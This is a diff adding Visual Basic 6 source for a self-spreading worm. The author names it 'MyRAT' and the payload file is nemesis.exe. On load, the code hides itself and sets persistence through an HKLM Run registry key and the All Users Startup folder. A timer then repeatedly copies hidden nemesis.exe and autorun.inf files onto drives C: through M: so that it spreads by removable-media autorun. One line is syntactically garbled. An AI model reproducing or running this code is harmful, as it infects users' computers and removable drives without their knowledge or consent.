@@ -1,0 +1,157 @@
+Private Sub Form_Load()
+On Error Resume Next
+Me.Hide
+
+App.TaskVisible = False
+Dim Startup
+Kill Startup = CreateObject("WScript.Shell")
+Startup.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MyRAT", App.Path & "\" & App.EXEName & ".exe"
+
+
+
+
+Kill "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\nemesis.exe"
+Kill "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\autorun.inf"
+
+
+
+FileCopy App.Path & "\nemesis.exe", "C:\nemesis.exe"
+SetAttr "C:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "C:\autorun.inf"
+SetAttr "C:\autorun.inf", vbHidden
+
+Set Startup = CreateObject("WScript.Shell")
+Startup.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\MyRAT", "C:\nemesis.exe"
+
+FileCopy App.Path & "\nemesis.exe", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\nemesis.exe"
+SetAttr "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\autorun.inf"
+SetAttr "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\autorun.inf", vbHidden
+
+
+End Sub
+
+Private Sub Timer1_Timer()
+On Error Resume Next
+
+
+SetAttr "C:\nemesis.exe", vbNormal
+SetAttr "D:\nemesis.exe", vbNormal
+SetAttr "E:\nemesis.exe", vbNormal
+SetAttr "F:\nemesis.exe", vbNormal
+SetAttr "G:\nemesis.exe", vbNormal
+SetAttr "H:\nemesis.exe", vbNormal
+SetAttr "I:\nemesis.exe", vbNormal
+SetAttr "J:\nemesis.exe", vbNormal
+SetAttr "K:\nemesis.exe", vbNormal
+SetAttr "L:\nemesis.exe", vbNormal
+SetAttr "M:\nemesis.exe", vbNormal
+
+SetAttr "C:\autorun.inf", vbNormal
+SetAttr "D:\autorun.inf", vbNormal
+SetAttr "E:\autorun.inf", vbNormal
+SetAttr "F:\autorun.inf", vbNormal
+SetAttr "G:\autorun.inf", vbNormal
+SetAttr "H:\autorun.inf", vbNormal
+SetAttr "I:\autorun.inf", vbNormal
+SetAttr "J:\autorun.inf", vbNormal
+SetAttr "K:\autorun.inf", vbNormal
+SetAttr "M:\autorun.inf", vbNormal
+SetAttr "N:\autorun.inf", vbNormal
+
+SetAttr App.Path & "\autorun.inf", vbHidden
+SetAttr App.Path & "\nemesis.exe", vbHidden
+
+
+
+Kill "D:\nemesis.exe"
+Kill "E:\nemesis.exe"
+Kill "F:\nemesis.exe"
+Kill "G:\nemesis.exe"
+Kill "H:\nemesis.exe"
+Kill "I:\nemesis.exe"
+Kill "J:\nemesis.exe"
+Kill "K:\nemesis.exe"
+Kill "L:\nemesis.exe"
+Kill "M:\nemesis.exe"
+Kill "C:\nemesis.exe"
+Kill "C:\autorun.inf"
+Kill "D:\autorun.inf"
+Kill "E:\autorun.inf"
+Kill "F:\autorun.inf"
+Kill "G:\autorun.inf"
+Kill "H:\autorun.inf"
+Kill "I:\autorun.inf"
+Kill "J:\autorun.inf"
+Kill "K:\autorun.inf"
+Kill "L:\autorun.inf"
+Kill "M:\autorun.inf"
+
+
+FileCopy App.Path & "\nemesis.exe", "C:\nemesis.exe"
+SetAttr "C:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "C:\autorun.inf"
+SetAttr "C:\autorun.inf", vbHidden
+
+FileCopy App.Path & "\nemesis.exe", "D:\nemesis.exe"
+SetAttr "D:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "D:\autorun.inf"
+SetAttr "D:\autorun.inf", vbHidden
+
+FileCopy App.Path & "\nemesis.exe", "E:\nemesis.exe"
+SetAttr "E:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "E:\autorun.inf"
+SetAttr "E:\autorun.inf", vbHidden
+
+
+
+FileCopy App.Path & "\nemesis.exe", "F:\nemesis.exe"
+SetAttr "F:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "F:\autorun.inf"
+SetAttr "F:\autorun.inf", vbHidden
+
+
+FileCopy App.Path & "\nemesis.exe", "G:\nemesis.exe"
+SetAttr "G:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "G:\autorun.inf"
+SetAttr "G:\autorun.inf", vbHidden
+
+
+FileCopy App.Path & "\nemesis.exe", "H:\nemesis.exe"
+SetAttr "H:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "H:\autorun.inf"
+SetAttr "H:\autorun.inf", vbHidden
+
+FileCopy App.Path & "\nemesis.exe", "I:\nemesis.exe"
+SetAttr "I:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "I:\autorun.inf"
+SetAttr "I:\autorun.inf", vbHidden
+
+
+FileCopy App.Path & "\nemesis.exe", "J:\nemesis.exe"
+SetAttr "J:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "J:\autorun.inf"
+SetAttr "J:\autorun.inf", vbHidden
+
+
+FileCopy App.Path & "\nemesis.exe", "K:\nemesis.exe"
+SetAttr "K:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "K:\autorun.inf"
+SetAttr "K:\autorun.inf", vbHidden
+
+
+FileCopy App.Path & "\nemesis.exe", "L:\nemesis.exe"
+SetAttr "L:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "L:\autorun.inf"
+SetAttr "L:\autorun.inf", vbHidden
+
+
+FileCopy App.Path & "\nemesis.exe", "M:\nemesis.exe"
+SetAttr "M:\nemesis.exe", vbHidden
+FileCopy App.Path & "\autorun.inf", "M:\autorun.inf"
+SetAttr "M:\autorun.inf", vbHidden
+
+
+
+
+End Sub
